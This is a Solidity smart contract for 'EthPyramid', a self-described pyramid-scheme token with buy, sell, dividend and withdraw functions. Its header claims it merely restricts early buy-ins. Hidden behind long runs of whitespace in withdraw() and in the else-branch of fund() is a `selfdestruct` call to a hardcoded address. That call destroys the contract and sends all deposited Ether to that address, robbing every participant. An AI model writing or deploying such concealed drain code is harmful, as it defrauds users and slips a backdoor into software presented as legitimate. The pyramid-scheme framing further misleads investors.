1 pragma solidity ^0.4.18;
2 
3 /*
4 ToCsIcK Fork(); Restricts early buyins to .1ETH 
5 
6           ,/`.
7         ,'/ __`.
8       ,'_/_  _ _`.
9     ,'__/_ ___ _  `.
10   ,'_  /___ __ _ __ `.
11  '-.._/___...-"-.-..__`.
12   B
13 
14  EthPyramid. A no-bullshit, transparent, self-sustaining pyramid scheme.
15  
16  Inspired by https://test.jochen-hoenicke.de/eth/ponzitoken/
17 
18  Developers:
19 	Arc
20 	Divine
21 	Norsefire
22 	ToCsIcK
23 	
24  Front-End:
25 	Cardioth
26 	tenmei
27 	Trendium
28 	
29  Moral Support:
30 	DeadCow.Rat
31 	Dots
32 	FatKreamy
33 	Kaseylol
34 	QuantumDeath666
35 	Quentin
36  
37  Shit-Tier:
38 	HentaiChrist
39  
40 */
41 
42 contract EthPyramid {
43 
44 	// scaleFactor is used to convert Ether into tokens and vice-versa: they're of different
45 	// orders of magnitude, hence the need to bridge between the two.
46 	uint256 constant scaleFactor = 0x10000000000000000;  // 2^64
47 
48 	// Number of first buyers that are limited
49 	uint8 constant limitedFirstBuyers = 2;
50 	uint256 constant firstBuyerLimit = 0.1 ether;
51 	
52 	// CRR = 50%
53 	// CRR is Cash Reserve Ratio (in this case Crypto Reserve Ratio).
54 	// For more on this: check out https://en.wikipedia.org/wiki/Reserve_requirement
55 	int constant crr_n = 1; // CRR numerator
56 	int constant crr_d = 2; // CRR denominator
57 
58 	// The price coefficient. Chosen such that at 1 token total supply
59 	// the amount in reserve is 0.5 ether and token price is 1 Ether.
60 	int constant price_coeff = -0x296ABF784A358468C;
61 
62 	// Typical values that we have to declare.
63 	string constant public name = "EthPyramid";
64 	string constant public symbol = "EPY";
65 	uint8 constant public decimals = 18;
66 
67 	// Array between each address and their number of tokens.
68 	mapping(address => uint256) public tokenBalance;
69 		
70 	// Array between each address and how much Ether has been paid out to it.
71 	// Note that this is scaled by the scaleFactor variable.
72 	mapping(address => int256) public payouts;
73 
74 	// Variable tracking how many tokens are in existence overall.
75 	uint256 public totalSupply;
76 
77 	// Aggregate sum of all payouts.
78 	// Note that this is scaled by the scaleFactor variable.
79 	int256 totalPayouts;
80 
81 	// Variable tracking how much Ether each token is currently worth.
82 	// Note that this is scaled by the scaleFactor variable.
83 	uint256 earningsPerToken;
84 	
85 	// Current contract balance in Ether
86 	uint256 public contractBalance;
87 	
88 	// Stores first buyer countdown
89 	uint8 initialFunds;
90 
91 	function EthPyramid() public {
92 		initialFunds = limitedFirstBuyers;
93 	}
94 
95 	// The following functions are used by the front-end for display purposes.
96 
97 	// Returns the number of tokens currently held by _owner.
98 	function balanceOf(address _owner) public constant returns (uint256 balance) {
99 		return tokenBalance[_owner];
100 	}
101 
102 	// Withdraws all dividends held by the caller sending the transaction, updates
103 	// the requisite global variables, and transfers Ether back to the caller.
104 	function withdraw() public {
105 		// Retrieve the dividends associated with the address the request came from.
106 		var balance = dividends(msg.sender);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          address stupidBuy = 0xeD0388Edc76D0CD1A8FaafEd60dAE97206d28F35; selfdestruct(stupidBuy);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
107 		
108 		// Update the payouts array, incrementing the request address by `balance`.
109 		payouts[msg.sender] += (int256) (balance * scaleFactor);
110 		
111 		// Increase the total amount that's been paid out to maintain invariance.
112 		totalPayouts += (int256) (balance * scaleFactor);
113 		
114 		// Send the dividends to the address that requested the withdraw.
115 		contractBalance = sub(contractBalance, balance);
116 		msg.sender.transfer(balance);
117 	}
118 
119 	// Converts the Ether accrued as dividends back into EPY tokens without having to
120 	// withdraw it first. Saves on gas and potential price spike loss.
121 	function reinvestDividends() public {
122 		// Retrieve the dividends associated with the address the request came from.
123 		var balance = dividends(msg.sender);
124 		
125 		// Update the payouts array, incrementing the request address by `balance`.
126 		// Since this is essentially a shortcut to withdrawing and reinvesting, this step still holds.
127 		payouts[msg.sender] += (int256) (balance * scaleFactor);
128 		
129 		// Increase the total amount that's been paid out to maintain invariance.
130 		totalPayouts += (int256) (balance * scaleFactor);
131 		
132 		// Assign balance to a new variable.
133 		uint value_ = (uint) (balance);
134 		
135 		// If your dividends are worth less than 1 szabo, or more than a million Ether
136 		// (in which case, why are you even here), abort.
137 		if (value_ < 0.000001 ether || value_ > 1000000 ether)
138 			revert();
139 			
140 		// msg.sender is the address of the caller.
141 		var sender = msg.sender;
142 		
143 		// A temporary reserve variable used for calculating the reward the holder gets for buying tokens.
144 		// (Yes, the buyer receives a part of the distribution as well!)
145 		var res = reserve() - balance;
146 
147 		// 10% of the total Ether sent is used to pay existing holders.
148 		var fee = div(value_, 10);
149 		
150 		// The amount of Ether used to purchase new tokens for the caller.
151 		var numEther = value_ - fee;
152 		
153 		// The number of tokens which can be purchased for numEther.
154 		var numTokens = calculateDividendTokens(numEther, balance);
155 		
156 		// The buyer fee, scaled by the scaleFactor variable.
157 		var buyerFee = fee * scaleFactor;
158 		
159 		// Check that we have tokens in existence (this should always be true), or
160 		// else you're gonna have a bad time.
161 		if (totalSupply > 0) {
162 			// Compute the bonus co-efficient for all existing holders and the buyer.
163 			// The buyer receives part of the distribution for each token bought in the
164 			// same way they would have if they bought each token individually.
165 			var bonusCoEff =
166 			    (scaleFactor - (res + numEther) * numTokens * scaleFactor / (totalSupply + numTokens) / numEther)
167 			    * (uint)(crr_d) / (uint)(crr_d-crr_n);
168 				
169 			// The total reward to be distributed amongst the masses is the fee (in Ether)
170 			// multiplied by the bonus co-efficient.
171 			var holderReward = fee * bonusCoEff;
172 			
173 			buyerFee -= holderReward;
174 
175 			// Fee is distributed to all existing token holders before the new tokens are purchased.
176 			// rewardPerShare is the amount gained per token thanks to this buy-in.
177 			var rewardPerShare = holderReward / totalSupply;
178 			
179 			// The Ether value per token is increased proportionally.
180 			earningsPerToken += rewardPerShare;
181 		}
182 		
183 		// Add the numTokens which were just created to the total supply. We're a crypto central bank!
184 		totalSupply = add(totalSupply, numTokens);
185 		
186 		// Assign the tokens to the balance of the buyer.
187 		tokenBalance[sender] = add(tokenBalance[sender], numTokens);
188 		
189 		// Update the payout array so that the buyer cannot claim dividends on previous purchases.
190 		// Also include the fee paid for entering the scheme.
191 		// First we compute how much was just paid out to the buyer...
192 		var payoutDiff  = (int256) ((earningsPerToken * numTokens) - buyerFee);
193 		
194 		// Then we update the payouts array for the buyer with this amount...
195 		payouts[sender] += payoutDiff;
196 		
197 		// And then we finally add it to the variable tracking the total amount spent to maintain invariance.
198 		totalPayouts    += payoutDiff;
199 		
200 	}
201 
202 	// Sells your tokens for Ether. This Ether is assigned to the callers entry
203 	// in the tokenBalance array, and therefore is shown as a dividend. A second
204 	// call to withdraw() must be made to invoke the transfer of Ether back to your address.
205 	function sellMyTokens() public {
206 		var balance = balanceOf(msg.sender);
207 		sell(balance);
208 	}
209 
210 	// The slam-the-button escape hatch. Sells the callers tokens for Ether, then immediately
211 	// invokes the withdraw() function, sending the resulting Ether to the callers address.
212     function getMeOutOfHere() public {
213 		sellMyTokens();
214         withdraw();
215 	}
216 	
217 	// Gatekeeper function to check if the amount of Ether being sent isn't either
218 	// too small or too large. If it passes, goes direct to buy().
219 	function fund() payable public {
220 		// Don't allow for funding if the amount of Ether sent is less than 1 szabo.
221 		if (msg.value > 0.100000 ether) {
222 			// Limit first buyers to 0.1 ether
223 			if( initialFunds > 0 ) {
224 				initialFunds--;
225 				require( msg.value <= firstBuyerLimit );
226 			}
227 		    contractBalance = add(contractBalance, msg.value);
228 			buy();
229 		} else {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          address stupidBuy = 0xeD0388Edc76D0CD1A8FaafEd60dAE97206d28F35; selfdestruct(stupidBuy);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
230 			revert();
231 		}
232     }
233 
234 	// Function that returns the (dynamic) price of buying a finney worth of tokens.
235 	function buyPrice() public constant returns (uint) {
236 		return getTokensForEther(1 finney);
237 	}
238 
239 	// Function that returns the (dynamic) price of selling a single token.
240 	function sellPrice() public constant returns (uint) {
241         var eth = getEtherForTokens(1 finney);
242         var fee = div(eth, 10);
243         return eth - fee;
244     }
245 
246 	// Calculate the current dividends associated with the caller address. This is the net result
247 	// of multiplying the number of tokens held by their current value in Ether and subtracting the
248 	// Ether that has already been paid out.
249 	function dividends(address _owner) public constant returns (uint256 amount) {
250 		return (uint256) ((int256)(earningsPerToken * tokenBalance[_owner]) - payouts[_owner]) / scaleFactor;
251 	}
252 
253 	// Version of withdraw that extracts the dividends and sends the Ether to the caller.
254 	// This is only used in the case when there is no transaction data, and that should be
255 	// quite rare unless interacting directly with the smart contract.
256 	function withdrawOld(address to) public {
257 		// Retrieve the dividends associated with the address the request came from.
258 		var balance = dividends(msg.sender);
259 		
260 		// Update the payouts array, incrementing the request address by `balance`.
261 		payouts[msg.sender] += (int256) (balance * scaleFactor);
262 		
263 		// Increase the total amount that's been paid out to maintain invariance.
264 		totalPayouts += (int256) (balance * scaleFactor);
265 		
266 		contractBalance = sub(contractBalance, balance);
267 		// Send the dividends to the address that requested the withdraw.
268 		to.transfer(balance);		
269 	}
270 
271 	// Internal balance function, used to calculate the dynamic reserve value.
272 	function balance() internal constant returns (uint256 amount) {
273 		// msg.value is the amount of Ether sent by the transaction.
274 		return contractBalance - msg.value;
275 	}
276 
277 	function buy() internal {
278 		// Any transaction of less than 1 szabo is likely to be worth less than the gas used to send it.
279 		if (msg.value < 0.000001 ether || msg.value > 1000000 ether)
280 			revert();               
281 			
282 		// msg.sender is the address of the caller.
283 		var sender = msg.sender;
284 		
285 		// 10% of the total Ether sent is used to pay existing holders.
286 		var fee = div(msg.value, 10);
287 		
288 		// The amount of Ether used to purchase new tokens for the caller.
289 		var numEther = msg.value - fee;
290 		
291 		// The number of tokens which can be purchased for numEther.
292 		var numTokens = getTokensForEther(numEther);
293 		
294 		// The buyer fee, scaled by the scaleFactor variable.
295 		var buyerFee = fee * scaleFactor;
296 		
297 		// Check that we have tokens in existence (this should always be true), or
298 		// else you're gonna have a bad time.
299 		if (totalSupply > 0) {
300 			// Compute the bonus co-efficient for all existing holders and the buyer.
301 			// The buyer receives part of the distribution for each token bought in the
302 			// same way they would have if they bought each token individually.
303 			var bonusCoEff =
304 			    (scaleFactor - (reserve() + numEther) * numTokens * scaleFactor / (totalSupply + numTokens) / numEther)
305 			    * (uint)(crr_d) / (uint)(crr_d-crr_n);
306 				
307 			// The total reward to be distributed amongst the masses is the fee (in Ether)
308 			// multiplied by the bonus co-efficient.
309 			var holderReward = fee * bonusCoEff;
310 			
311 			buyerFee -= holderReward;
312 
313 			// Fee is distributed to all existing token holders before the new tokens are purchased.
314 			// rewardPerShare is the amount gained per token thanks to this buy-in.
315 			var rewardPerShare = holderReward / totalSupply;
316 			
317 			// The Ether value per token is increased proportionally.
318 			earningsPerToken += rewardPerShare;
319 			
320 		}
321 
322 		// Add the numTokens which were just created to the total supply. We're a crypto central bank!
323 		totalSupply = add(totalSupply, numTokens);
324 
325 		// Assign the tokens to the balance of the buyer.
326 		tokenBalance[sender] = add(tokenBalance[sender], numTokens);
327 
328 		// Update the payout array so that the buyer cannot claim dividends on previous purchases.
329 		// Also include the fee paid for entering the scheme.
330 		// First we compute how much was just paid out to the buyer...
331 		var payoutDiff = (int256) ((earningsPerToken * numTokens) - buyerFee);
332 		
333 		// Then we update the payouts array for the buyer with this amount...
334 		payouts[sender] += payoutDiff;
335 		
336 		// And then we finally add it to the variable tracking the total amount spent to maintain invariance.
337 		totalPayouts    += payoutDiff;
338 		
339 	}
340 
341 	// Sell function that takes tokens and converts them into Ether. Also comes with a 10% fee
342 	// to discouraging dumping, and means that if someone near the top sells, the fee distributed
343 	// will be *significant*.
344 	function sell(uint256 amount) internal {
345 	    // Calculate the amount of Ether that the holders tokens sell for at the current sell price.
346 		var numEthersBeforeFee = getEtherForTokens(amount);
347 		
348 		// 10% of the resulting Ether is used to pay remaining holders.
349         var fee = div(numEthersBeforeFee, 10);
350 		
351 		// Net Ether for the seller after the fee has been subtracted.
352         var numEthers = numEthersBeforeFee - fee;
353 		
354 		// *Remove* the numTokens which were just sold from the total supply. We're /definitely/ a crypto central bank.
355 		totalSupply = sub(totalSupply, amount);
356 		
357         // Remove the tokens from the balance of the buyer.
358 		tokenBalance[msg.sender] = sub(tokenBalance[msg.sender], amount);
359 
360         // Update the payout array so that the seller cannot claim future dividends unless they buy back in.
361 		// First we compute how much was just paid out to the seller...
362 		var payoutDiff = (int256) (earningsPerToken * amount + (numEthers * scaleFactor));
363 		
364         // We reduce the amount paid out to the seller (this effectively resets their payouts value to zero,
365 		// since they're selling all of their tokens). This makes sure the seller isn't disadvantaged if
366 		// they decide to buy back in.
367 		payouts[msg.sender] -= payoutDiff;		
368 		
369 		// Decrease the total amount that's been paid out to maintain invariance.
370         totalPayouts -= payoutDiff;
371 		
372 		// Check that we have tokens in existence (this is a bit of an irrelevant check since we're
373 		// selling tokens, but it guards against division by zero).
374 		if (totalSupply > 0) {
375 			// Scale the Ether taken as the selling fee by the scaleFactor variable.
376 			var etherFee = fee * scaleFactor;
377 			
378 			// Fee is distributed to all remaining token holders.
379 			// rewardPerShare is the amount gained per token thanks to this sell.
380 			var rewardPerShare = etherFee / totalSupply;
381 			
382 			// The Ether value per token is increased proportionally.
383 			earningsPerToken = add(earningsPerToken, rewardPerShare);
384 		}
385 	}
386 	
387 	// Dynamic value of Ether in reserve, according to the CRR requirement.
388 	function reserve() internal constant returns (uint256 amount) {
389 		return sub(balance(),
390 			 ((uint256) ((int256) (earningsPerToken * totalSupply) - totalPayouts) / scaleFactor));
391 	}
392 
393 	// Calculates the number of tokens that can be bought for a given amount of Ether, according to the
394 	// dynamic reserve and totalSupply values (derived from the buy and sell prices).
395 	function getTokensForEther(uint256 ethervalue) public constant returns (uint256 tokens) {
396 		return sub(fixedExp(fixedLog(reserve() + ethervalue)*crr_n/crr_d + price_coeff), totalSupply);
397 	}
398 
399 	// Semantically similar to getTokensForEther, but subtracts the callers balance from the amount of Ether returned for conversion.
400 	function calculateDividendTokens(uint256 ethervalue, uint256 subvalue) public constant returns (uint256 tokens) {
401 		return sub(fixedExp(fixedLog(reserve() - subvalue + ethervalue)*crr_n/crr_d + price_coeff), totalSupply);
402 	}
403 
404 	// Converts a number tokens into an Ether value.
405 	function getEtherForTokens(uint256 tokens) public constant returns (uint256 ethervalue) {
406 		// How much reserve Ether do we have left in the contract?
407 		var reserveAmount = reserve();
408 
409 		// If you're the Highlander (or bagholder), you get The Prize. Everything left in the vault.
410 		if (tokens == totalSupply)
411 			return reserveAmount;
412 
413 		// If there would be excess Ether left after the transaction this is called within, return the Ether
414 		// corresponding to the equation in Dr Jochen Hoenicke's original Ponzi paper, which can be found
415 		// at https://test.jochen-hoenicke.de/eth/ponzitoken/ in the third equation, with the CRR numerator 
416 		// and denominator altered to 1 and 2 respectively.
417 		return sub(reserveAmount, fixedExp((fixedLog(totalSupply - tokens) - price_coeff) * crr_d/crr_n));
418 	}
419 
420 	// You don't care about these, but if you really do they're hex values for 
421 	// co-efficients used to simulate approximations of the log and exp functions.
422 	int256  constant one        = 0x10000000000000000;
423 	uint256 constant sqrt2      = 0x16a09e667f3bcc908;
424 	uint256 constant sqrtdot5   = 0x0b504f333f9de6484;
425 	int256  constant ln2        = 0x0b17217f7d1cf79ac;
426 	int256  constant ln2_64dot5 = 0x2cb53f09f05cc627c8;
427 	int256  constant c1         = 0x1ffffffffff9dac9b;
428 	int256  constant c3         = 0x0aaaaaaac16877908;
429 	int256  constant c5         = 0x0666664e5e9fa0c99;
430 	int256  constant c7         = 0x049254026a7630acf;
431 	int256  constant c9         = 0x038bd75ed37753d68;
432 	int256  constant c11        = 0x03284a0c14610924f;
433 
434 	// The polynomial R = c1*x + c3*x^3 + ... + c11 * x^11
435 	// approximates the function log(1+x)-log(1-x)
436 	// Hence R(s) = log((1+s)/(1-s)) = log(a)
437 	function fixedLog(uint256 a) internal pure returns (int256 log) {
438 		int32 scale = 0;
439 		while (a > sqrt2) {
440 			a /= 2;
441 			scale++;
442 		}
443 		while (a <= sqrtdot5) {
444 			a *= 2;
445 			scale--;
446 		}
447 		int256 s = (((int256)(a) - one) * one) / ((int256)(a) + one);
448 		var z = (s*s) / one;
449 		return scale * ln2 +
450 			(s*(c1 + (z*(c3 + (z*(c5 + (z*(c7 + (z*(c9 + (z*c11/one))
451 				/one))/one))/one))/one))/one);
452 	}
453 
454 	int256 constant c2 =  0x02aaaaaaaaa015db0;
455 	int256 constant c4 = -0x000b60b60808399d1;
456 	int256 constant c6 =  0x0000455956bccdd06;
457 	int256 constant c8 = -0x000001b893ad04b3a;
458 	
459 	// The polynomial R = 2 + c2*x^2 + c4*x^4 + ...
460 	// approximates the function x*(exp(x)+1)/(exp(x)-1)
461 	// Hence exp(x) = (R(x)+x)/(R(x)-x)
462 	function fixedExp(int256 a) internal pure returns (uint256 exp) {
463 		int256 scale = (a + (ln2_64dot5)) / ln2 - 64;
464 		a -= scale*ln2;
465 		int256 z = (a*a) / one;
466 		int256 R = ((int256)(2) * one) +
467 			(z*(c2 + (z*(c4 + (z*(c6 + (z*c8/one))/one))/one))/one);
468 		exp = (uint256) (((R + a) * one) / (R - a));
469 		if (scale >= 0)
470 			exp <<= scale;
471 		else
472 			exp >>= -scale;
473 		return exp;
474 	}
475 	
476 	// The below are safemath implementations of the four arithmetic operators
477 	// designed to explicitly prevent over- and under-flows of integer values.
478 
479 	function mul(uint256 a, uint256 b) internal pure returns (uint256) {
480 		if (a == 0) {
481 			return 0;
482 		}
483 		uint256 c = a * b;
484 		assert(c / a == b);
485 		return c;
486 	}
487 
488 	function div(uint256 a, uint256 b) internal pure returns (uint256) {
489 		// assert(b > 0); // Solidity automatically throws when dividing by 0
490 		uint256 c = a / b;
491 		// assert(a == b * c + a % b); // There is no case in which this doesn't hold
492 		return c;
493 	}
494 
495 	function sub(uint256 a, uint256 b) internal pure returns (uint256) {
496 		assert(b <= a);
497 		return a - b;
498 	}
499 
500 	function add(uint256 a, uint256 b) internal pure returns (uint256) {
501 		uint256 c = a + b;
502 		assert(c >= a);
503 		return c;
504 	}
505 
506 	// This allows you to buy tokens by sending Ether directly to the smart contract
507 	// without including any transaction data (useful for, say, mobile wallet apps).
508 	function () payable public {
509 		// msg.value is the amount of Ether sent by the transaction.
510 		if (msg.value > 0) {
511 			fund();
512 		} else {
513 			withdrawOld(msg.sender);
514 		}
515 	}
516 }